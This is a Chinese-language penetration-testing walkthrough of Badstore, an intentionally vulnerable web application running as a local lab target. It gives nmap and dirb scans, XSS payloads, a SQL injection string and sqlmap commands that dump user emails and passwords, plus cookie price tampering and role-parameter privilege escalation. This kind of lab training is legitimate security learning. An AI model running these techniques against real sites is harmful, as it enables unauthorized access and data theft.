# Badstore 1.2.3

项目地址

```baba
docker pull suc2es2/badstore
```

使用 Nmap 扫描出开放服务及操作系统版本

```bash
nmap -sS -sV -O -p- 192.168.41.129	
```

![](https://pic1.imgdb.cn/item/69156f743203f7be00fd6d69.png)

打开访问网站

![](https://pic1.imgdb.cn/item/69157e573203f7be00fe2c23.png)

使用 dirb 扫描后台

```bash
dirb http://192.168.41.129:8080/
```

![](https://pic1.imgdb.cn/item/69157edd3203f7be00fe33a7.png)

## 敏感信息泄露

### /supplier/accounts

**路径 `/supplier/accounts` 泄露了类型 `etc/passwd` 的敏感信息**

![](https://pic1.imgdb.cn/item/69157f133203f7be00fe36ff.png)

Base64 解码出来

![](https://pic1.imgdb.cn/item/69157f853203f7be00fe3d6c.png)

## XSS

### Search 搜索框（反射）

对搜索框输入测试发现 SQL 报错语句

![](https://pic1.imgdb.cn/item/69157fe63203f7be00fe4304.png)

**应该将 `1` 回显到了网页上所以测试反射 XSS 漏洞发现也存在**

```
<script>alert(1)</script>
```

![](https://pic1.imgdb.cn/item/691580193203f7be00fe45dd.png)

### Sign Our Guestbook（三个存储）

Sign Our Guestbook 中存在**三个存储 XSS 漏洞**

```
<script>alert(1)</script>
```

![](https://pic1.imgdb.cn/item/695e1ae9ee664bba8768028f.png)

![](https://pic1.imgdb.cn/item/695e1b1fee664bba8768029d.png)

![](https://pic1.imgdb.cn/item/695e1b4aee664bba8768029f.png)

![](https://pic1.imgdb.cn/item/695e1b33ee664bba8768029e.png)

### My Account（未登录，反射）

在邮件地址这里

![](https://pic1.imgdb.cn/item/6967233f99f37a647f572102.png)

直接回显到了网页上，**反射型 XSS**

![](https://pic1.imgdb.cn/item/6967235899f37a647f572119.png)

同样存在 XSS 漏洞

![](https://pic1.imgdb.cn/item/6967238f99f37a647f572146.png)

### My Account（已登录，两个存储）

构造 XSS Payload

![](https://pic1.imgdb.cn/item/6967501699f37a647f5807b6.png)

第一个弹窗了

![](https://pic1.imgdb.cn/item/6967504d99f37a647f5807ff.png)

第二个也是

![](https://pic1.imgdb.cn/item/6967507199f37a647f580829.png)

### Login/Register（两个存储）

在注册的 `Full Name` 中存在**存储型 XSS 漏洞**

![](https://pic1.imgdb.cn/item/6967242099f37a647f5721e7.png)

![](https://pic1.imgdb.cn/item/696723e899f37a647f5721a9.png)

同时 `Email Address` 也存在 **存储型 XSS**

![](https://pic1.imgdb.cn/item/6967255d99f37a647f5722f6.png)

![](https://pic1.imgdb.cn/item/696725a299f37a647f572344.png)

### Adminpotal Add User（存储）

拿到管理员权限后在用户添加处存在**存储型 XSS** 漏洞

![](https://pic1.imgdb.cn/item/69672d1699f37a647f572b2a.png)

![](https://pic1.imgdb.cn/item/69672ccb99f37a647f572a9b.png)

## SQL 注入

### Search 搜索框

**注入万能语句回显正常**

```sql
' or 1=1 #
```

![](https://pic1.imgdb.cn/item/691580a93203f7be00fe4d90.png)

推测没有做任何过滤，直接上 SQLMap 爆库

```bash
sqlmap -u "http://192.168.41.129:8080/cgi-bin/badstore.cgi" --data="searchquery=1&action=search" --dbs
```

![](https://pic1.imgdb.cn/item/691581c23203f7be00fe6524.png)

爆表

```bash
sqlmap -u "http://192.168.41.129:8080/cgi-bin/badstore.cgi" --data="searchquery=1&action=search" -D badstoredb --tables
```

![](https://pic1.imgdb.cn/item/691582de3203f7be00fe6bf0.png)

直接爆用户表字段

```ba
sqlmap -u "http://192.168.41.129:8080/cgi-bin/badstore.cgi" --data="searchquery=1&action=search" -D badstoredb -T userdb --columns
```

![](https://pic1.imgdb.cn/item/691584583203f7be00fe6e51.png)

随便就是 dump 出数据发现 admin

```bash
sqlmap -u "http://192.168.41.129:8080/cgi-bin/badstore.cgi" --data="searchquery=1&action=search" -D badstoredb -T userdb -C email --dump
```

![](https://pic1.imgdb.cn/item/691584e23203f7be00fe6f48.png)

再 dump 出密码

```bash
sqlmap -u "http://192.168.41.129:8080/cgi-bin/badstore.cgi" --data="searchquery=1&action=search" -D badstoredb -T userdb -C passwd --dump
```

![](https://pic1.imgdb.cn/item/691585743203f7be00fe707c.png)

撞库出密码

![](https://pic1.imgdb.cn/item/691585b13203f7be00fe720d.png)

结果登不进去

### Supplier Login

在这个登录处同样存在 SQL 注入漏洞，参数是 `email`

![](https://pic1.imgdb.cn/item/691588643203f7be00fe86d9.png)

![](https://pic1.imgdb.cn/item/696722db99f37a647f57209e.png)

![](https://pic1.imgdb.cn/item/695f188a91a79def7e4d8ebc.png)

### Login/Register

在登录处也是 `email` 参数存在 SQL 注入

![](https://pic1.imgdb.cn/item/696728dc99f37a647f5726a3.png)

![](https://pic1.imgdb.cn/item/696728cc99f37a647f572691.png)

### Adminpotal Add User

拿到管理员权限后在添加用户处 `email` 参数**存在 SQL 注入漏洞**

![](https://pic1.imgdb.cn/item/69672d1699f37a647f572b2a.png)

![](https://pic1.imgdb.cn/item/69672d6399f37a647f572b7e.png)

### Adminpotal Delete User

同样在删除用户处也存在 SQL 注入

![](https://pic1.imgdb.cn/item/69672dd699f37a647f572c0d.png)

## 任意密码重置

### Reset User Password

在页面找到一个重置密码功能

![](https://pic1.imgdb.cn/item/691588043203f7be00fe8637.png)

推测**存在任意密码重置漏洞**，重置后给出新密码 `Welcome`

![](https://pic1.imgdb.cn/item/691587cb3203f7be00fe84bd.png)

## 支付漏洞

### View Cart

需要先将物品添加到购物车

![](https://pic1.imgdb.cn/item/696729e199f37a647f5727aa.png)

抓包解码发现价格参数在 Cookie 中

![](https://pic1.imgdb.cn/item/69672a6299f37a647f57283e.png)

直接浏览器里更改

![](https://pic1.imgdb.cn/item/69672a5799f37a647f572830.png)

在最后付款页面推测还可能存在 SQL 注入及 XSS

## 越权

### Login/Register

抓注册包发现有一个权限参数 `role`

![](https://pic1.imgdb.cn/item/69672ae399f37a647f5728c0.png)

改为 A 发送

![](https://pic1.imgdb.cn/item/69672b4899f37a647f57291f.png)

越权成功

![](https://pic1.imgdb.cn/item/69672c0999f37a647f5729cb.png)